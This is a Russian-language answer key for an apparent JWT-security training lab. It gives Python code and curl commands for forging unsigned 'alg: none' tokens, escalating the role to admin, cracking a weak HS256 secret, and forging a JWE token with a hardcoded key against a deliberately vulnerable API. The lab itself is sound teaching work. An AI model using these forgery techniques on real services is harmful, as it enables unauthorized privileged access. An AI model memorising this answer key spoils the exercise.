# Решения

Эталонные ответы по каждой задаче. Все значения соответствуют `server/app/config.py`.

## Общие константы

- Слабый секрет HS256: `secret123`
- Общий ключ JWE (base64url, 32 байта): производный от
  `0123456789ABCDEF0123456789abcdef`

## Задача 1 — `/public`

Токен не нужен. Ожидается `200 OK` с приветствием.

## Задача 2 — `/private/none`

Соберите неподписанный токен с завершающей точкой:

```python
import base64, json
b64 = lambda d: base64.urlsafe_b64encode(d).rstrip(b"=").decode()
header = b64(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64(json.dumps({"sub": "hacker", "role": "user"}).encode())
token = f"{header}.{payload}."
```

```
curl -H "Authorization: Bearer <token>" http://<API_URL>/private/none
```

Ожидается `200 OK`. Подпись не проверяется.

## Задача 3 — `/private/admin`

Та же сборка с `"role":"admin"`:

```
curl -H "Authorization: Bearer <token>" http://<API_URL>/private/admin
```

Ожидается `200 OK` с админским доступом.

## Задача 4 — `/private/signed`

Восстановите слабый секрет офлайн-подбором из перехваченного токена:

```
python scripts/crack_hs256.py "<перехваченный-токен>"
# [+] Secret found: 'secret123' (tried 2 candidates)
```

То же значение встроено в exe (см. `docs/student_handout.md`) -> `secret123`.
Подбор работает, потому что HS256 = HMAC-SHA256(key, header + "." + payload), поэтому
кандидата в секреты можно проверить, пересчитав подпись локально.

```python
import jwt
token = jwt.encode({"sub": "hacker", "role": "admin"}, "secret123", algorithm="HS256")
```

```
curl -H "Authorization: Bearer <token>" http://<API_URL>/private/signed
```

Ожидается `200 OK`.

## Задача 5 — `/private/encrypted`

Замечание: jwt.io не может декодировать этот токен (это JWE, а не JWS) и сообщит
`Invalid Compact JWS`. Используйте хелпер или код ниже.

Быстрый путь через предоставленный хелпер:

```
python scripts/jwe_helper.py decode "<перехваченный-токен>"
python scripts/jwe_helper.py forge --role admin --sub hacker
```

Либо расшифруйте перехваченный JWE общим ключом, измените payload, зашифруйте заново:

```python
import json
from jwcrypto import jwe, jwk

key = jwk.JWK(k="MDEyMzQ1Njc4OUFCQ0RFRjAxMjM0NTY3ODlhYmNkZWY", kty="oct")
env = jwe.JWE(
    json.dumps({"sub": "hacker", "role": "admin"}).encode(),
    protected={"alg": "dir", "enc": "A256GCM"},
)
env.add_recipient(key)
token = env.serialize(compact=True)
```

```
curl -H "Authorization: Bearer <token>" http://<API_URL>/private/encrypted
```

Ожидается `200 OK` и возврат расшифрованных подделанных claims.

## Ручная проверка всей цепочки

1. Запустите API и поднимите туннель.
2. Перехватывайте Wireshark, нажимая кнопки в клиенте.
3. Пересоберите каждый перехваченный токен по шагам выше.
4. Повторно отправьте подделанные токены через `curl` и убедитесь в `200 OK`.

## Автоматическая проверка

```
.venv\Scripts\python -m pytest tests -q
```

Все 12 тестов проходят, включая подделанный админский доступ на неподписанном, подписанном
и шифрованном эндпоинтах.
